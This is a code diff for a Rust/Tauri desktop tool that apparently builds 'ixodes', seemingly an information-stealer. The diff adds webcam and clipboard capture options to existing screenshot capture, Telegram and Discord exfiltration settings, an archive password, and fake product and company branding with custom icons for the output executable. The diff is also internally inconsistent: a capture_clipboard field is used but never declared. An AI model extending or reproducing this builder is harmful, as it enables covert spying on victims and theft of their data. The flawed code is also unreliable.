@@ -1,9 +1,9 @@
+use image::GenericImageView;
 use serde::{Deserialize, Serialize};
 use std::fs;
 use std::path::{Path, PathBuf};
 use std::process::Command;
 use std::time::{SystemTime, UNIX_EPOCH};
-use image::GenericImageView;
 use tauri::path::BaseDirectory;
 use tauri::{AppHandle, Manager};
 
@@ -43,6 +43,8 @@ struct RecoverySettings {
     telegram_chat_id: Option<String>,
     discord_webhook: Option<String>,
     capture_screenshots: Option<bool>,
+    capture_webcams: Option<bool>,
+    capture_clipboard: Option<bool>,
 }
 
 #[derive(Debug, Deserialize)]
@@ -116,6 +118,8 @@ fn render_settings_rs(settings: &RecoverySettings) -> Result<String, String> {
     };
 
     let default_capture_screenshots = settings.capture_screenshots.unwrap_or(false);
+    let default_capture_webcams = settings.capture_webcams.unwrap_or(false);
+    let default_capture_clipboard = settings.capture_clipboard.unwrap_or(false);
 
     Ok(format!(
         r#"use crate::recovery::task::RecoveryCategory;
@@ -127,6 +131,8 @@ use tracing::{{info, warn}};
 static DEFAULT_ALLOWED_CATEGORIES: Option<&[RecoveryCategory]> = {default_categories};
 static DEFAULT_ARTIFACT_KEY: Option<&str> = {default_artifact_key};
 static DEFAULT_CAPTURE_SCREENSHOTS: bool = {default_capture_screenshots};
+static DEFAULT_CAPTURE_WEBCAMS: bool = {default_capture_webcams};
+static DEFAULT_CAPTURE_CLIPBOARD: bool = {default_capture_clipboard};
 
 static GLOBAL_RECOVERY_CONTROL: Lazy<RecoveryControl> = Lazy::new(RecoveryControl::from_env);
 
@@ -135,6 +141,7 @@ pub struct RecoveryControl {{
     allowed_categories: Option<HashSet<RecoveryCategory>>,
     artifact_key: Option<Vec<u8>>,
     capture_screenshots: bool,
+    capture_webcams: bool,
 }}
 
 impl RecoveryControl {{
@@ -155,6 +162,14 @@ impl RecoveryControl {{
 
     pub fn capture_screenshots(&self) -> bool {{
         self.capture_screenshots
+    }}
+
+    pub fn capture_webcams(&self) -> bool {{
+        self.capture_webcams
+    }}
+
+    pub fn capture_clipboard(&self) -> bool {{
+        self.capture_clipboard
     }}
 
     fn from_env() -> Self {{
@@ -185,11 +200,17 @@ impl RecoveryControl {{
 
         let capture_screenshots =
             parse_flag("IXODES_CAPTURE_SCREENSHOTS").unwrap_or(DEFAULT_CAPTURE_SCREENSHOTS);
+        let capture_webcams =
+            parse_flag("IXODES_CAPTURE_WEBCAM").unwrap_or(DEFAULT_CAPTURE_WEBCAMS);
+        let capture_clipboard =
+            parse_flag("IXODES_CAPTURE_CLIPBOARD").unwrap_or(DEFAULT_CAPTURE_CLIPBOARD);
 
         RecoveryControl {{
             allowed_categories,
             artifact_key,
             capture_screenshots,
+            capture_webcams,
+            capture_clipboard,
         }}
     }}
 }}
@@ -265,8 +286,8 @@ fn list_settings_files() -> Result<Vec<SettingsFile>, String> {
     let recovery_dir = recovery_dir(&ixodes_root);
     let default_settings = settings_path(&ixodes_root);
 
-    let entries = fs::read_dir(&recovery_dir)
-        .map_err(|err| format!("failed to read recovery dir: {err}"))?;
+    let entries =
+        fs::read_dir(&recovery_dir).map_err(|err| format!("failed to read recovery dir: {err}"))?;
 
     let mut files: Vec<SettingsFile> = entries
         .filter_map(|entry| entry.ok())
@@ -324,13 +345,9 @@ fn build_ixodes_sync(app: AppHandle, request: BuildRequest) -> Result<BuildResul
         .current_dir(&ixodes_root)
         .env(
             "IXODES_PASSWORD",
-            request
-                .settings
-                .archive_password
-                .as_deref()
-                .unwrap_or(""),
+            request.settings.archive_password.as_deref().unwrap_or(""),
         );
-    
+
     if let Some(token) = &request.settings.telegram_token {
         if !token.is_empty() {
             command.env("IXODES_TELEGRAM_TOKEN", token);
@@ -373,7 +390,11 @@ fn build_ixodes_sync(app: AppHandle, request: BuildRequest) -> Result<BuildResul
         });
     }
 
-    let exe_name = if cfg!(windows) { "ixodes.exe" } else { "ixodes" };
+    let exe_name = if cfg!(windows) {
+        "ixodes.exe"
+    } else {
+        "ixodes"
+    };
     let exe_path = ixodes_root.join("target").join("release").join(exe_name);
     if !exe_path.exists() {
         return Ok(BuildResult {
@@ -447,13 +468,21 @@ fn apply_branding_env(
         command.env("IXODES_ICON_PATH", icon.to_string_lossy().to_string());
     }
 
-    set_env_if_present(command, "IXODES_PRODUCT_NAME", branding.product_name.as_deref());
+    set_env_if_present(
+        command,
+        "IXODES_PRODUCT_NAME",
+        branding.product_name.as_deref(),
+    );
     set_env_if_present(
         command,
         "IXODES_FILE_DESCRIPTION",
         branding.file_description.as_deref(),
     );
-    set_env_if_present(command, "IXODES_COMPANY_NAME", branding.company_name.as_deref());
+    set_env_if_present(
+        command,
+        "IXODES_COMPANY_NAME",
+        branding.company_name.as_deref(),
+    );
     set_env_if_present(
         command,
         "IXODES_PRODUCT_VERSION",
@@ -475,7 +504,10 @@ fn set_env_if_present(command: &mut Command, key: &str, value: Option<&str>) {
     }
 }
 
-fn resolve_icon_path(app: &AppHandle, branding: &BrandingSettings) -> Result<Option<PathBuf>, String> {
+fn resolve_icon_path(
+    app: &AppHandle,
+    branding: &BrandingSettings,
+) -> Result<Option<PathBuf>, String> {
     if let Some(source) = branding
         .icon_source
         .as_deref()
@@ -564,8 +596,8 @@ fn select_icon_from_dir(dir: &Path) -> Option<PathBuf> {
 }
 
 fn download_icon(url: &str) -> Result<Vec<u8>, String> {
-    let response = reqwest::blocking::get(url)
-        .map_err(|err| format!("failed to download icon: {err}"))?;
+    let response =
+        reqwest::blocking::get(url).map_err(|err| format!("failed to download icon: {err}"))?;
     if !response.status().is_success() {
         return Err(format!("icon download failed ({})", response.status()));
     }
@@ -578,8 +610,11 @@ fn download_icon(url: &str) -> Result<Vec<u8>, String> {
         .bytes()
         .map_err(|err| format!("failed to read icon response: {err}"))?;
 
-    let _ = icon_extension_from_url(url)
-        .or_else(|| content_type.as_deref().and_then(icon_extension_from_content_type));
+    let _ = icon_extension_from_url(url).or_else(|| {
+        content_type
+            .as_deref()
+            .and_then(icon_extension_from_content_type)
+    });
 
     Ok(bytes.to_vec())
 }
@@ -605,7 +640,10 @@ fn resolve_preset_icon(app: &AppHandle, preset: &str) -> Result<PathBuf, String>
         }
     }
 
-    Err(format!("preset icon not found: presets/{}.(ico|png)", preset))
+    Err(format!(
+        "preset icon not found: presets/{}.(ico|png)",
+        preset
+    ))
 }
 
 fn icon_extension_from_url(url: &str) -> Option<String> {
@@ -682,13 +720,12 @@ fn normalize_icon_from_bytes(bytes: &[u8], target_ext: &str) -> Result<PathBuf, 
         let icon = ico::IconImage::from_rgba_data(256, 256, rgba.into_raw());
         let mut dir = ico::IconDir::new(ico::ResourceType::Icon);
         dir.add_entry(ico::IconDirEntry::encode(&icon).map_err(|err| err.to_string())?);
-        let mut file = fs::File::create(&path)
-            .map_err(|err| format!("failed to write icon: {err}"))?;
+        let mut file =
+            fs::File::create(&path).map_err(|err| format!("failed to write icon: {err}"))?;
         dir.write(&mut file)
             .map_err(|err| format!("failed to write ico: {err}"))?;
     } else {
-        rgba
-            .save(&path)
+        rgba.save(&path)
             .map_err(|err| format!("failed to write icon: {err}"))?;
     }
 
